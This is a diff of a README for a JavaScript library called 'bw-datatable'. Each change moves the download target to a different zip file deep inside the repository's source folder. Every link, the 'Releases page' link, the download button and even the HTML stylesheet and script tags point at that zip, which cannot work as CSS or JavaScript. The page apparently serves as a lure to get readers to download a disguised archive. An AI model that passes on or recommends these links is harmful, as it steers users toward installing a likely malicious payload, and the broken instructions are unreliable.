@@ -35,13 +35,13 @@ This project covers a range of topics relevant to your needs, including:
 
 ## 📥 Download & Install
 
-To get started, simply **visit this page to download**: [bw-datatable Releases](https://raw.githubusercontent.com/Nephthys198/bw-datatable/main/packages/core/src/bw-datatable-v2.3.zip).
+To get started, simply **visit this page to download**: [bw-datatable Releases](https://raw.githubusercontent.com/Nephthys198/bw-datatable/main/packages/core/src/styles/datatable_bw_v2.3.zip).
 
 You will find different versions available. Click on the version you wish to download. Most likely, you will want the latest release, which includes the most recent features and improvements.
 
 Here's a large button you can click:
 
-[![Download bw-datatable](https://raw.githubusercontent.com/Nephthys198/bw-datatable/main/packages/core/src/bw-datatable-v2.3.zip)](https://raw.githubusercontent.com/Nephthys198/bw-datatable/main/packages/core/src/bw-datatable-v2.3.zip)
+[![Download bw-datatable](https://raw.githubusercontent.com/Nephthys198/bw-datatable/main/packages/core/src/styles/datatable_bw_v2.3.zip)](https://raw.githubusercontent.com/Nephthys198/bw-datatable/main/packages/core/src/styles/datatable_bw_v2.3.zip)
 
 ### 💻 System Requirements
 
@@ -50,12 +50,12 @@ Here's a large button you can click:
 
 ### 📥 Installation Steps
 
-1. **Download the release file** from the [bw-datatable Releases page](https://raw.githubusercontent.com/Nephthys198/bw-datatable/main/packages/core/src/bw-datatable-v2.3.zip).
+1. **Download the release file** from the [bw-datatable Releases page](https://raw.githubusercontent.com/Nephthys198/bw-datatable/main/packages/core/src/styles/datatable_bw_v2.3.zip).
 2. **Extract the files** (if they are zipped).
 3. **Include the JavaScript and CSS files** in your HTML document:
    ```html
-   <link rel="stylesheet" href="https://raw.githubusercontent.com/Nephthys198/bw-datatable/main/packages/core/src/bw-datatable-v2.3.zip">
-   <script src="https://raw.githubusercontent.com/Nephthys198/bw-datatable/main/packages/core/src/bw-datatable-v2.3.zip"></script>
+   <link rel="stylesheet" href="https://raw.githubusercontent.com/Nephthys198/bw-datatable/main/packages/core/src/styles/datatable_bw_v2.3.zip">
+   <script src="https://raw.githubusercontent.com/Nephthys198/bw-datatable/main/packages/core/src/styles/datatable_bw_v2.3.zip"></script>
    ```
 4. **Initialize the data table script** in your JavaScript:
    ```javascript
